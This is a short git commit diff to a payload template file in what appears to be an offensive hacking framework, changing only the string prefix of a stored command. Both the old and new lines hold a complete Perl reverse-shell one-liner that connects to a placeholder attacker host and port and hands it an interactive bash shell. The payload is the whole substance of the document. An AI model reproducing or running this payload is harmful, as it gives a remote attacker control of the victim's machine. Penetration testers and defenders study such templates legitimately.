7ce96dffe478513e92b3e9fde055b61184769a31
Panagiotis Chartas <t3l3machus@protonmail.com>
2024-07-28 15:21:19 +0200

    Update perl_no_sh_reverse_tcp.py

--- Core/payload_templates/linux/netcat/perl_no_sh_reverse_tcp.py
+++ Core/payload_templates/linux/netcat/perl_no_sh_reverse_tcp.py
@@ -23,5 +23,5 @@ class Payload:
 
     attrs = {}
 
-    data = r"perl -e 'use Socket;$i=\"*LHOST*\";$p=*LPORT*;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
+    data = "perl -e 'use Socket;$i=\"*LHOST*\";$p=*LPORT*;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
    
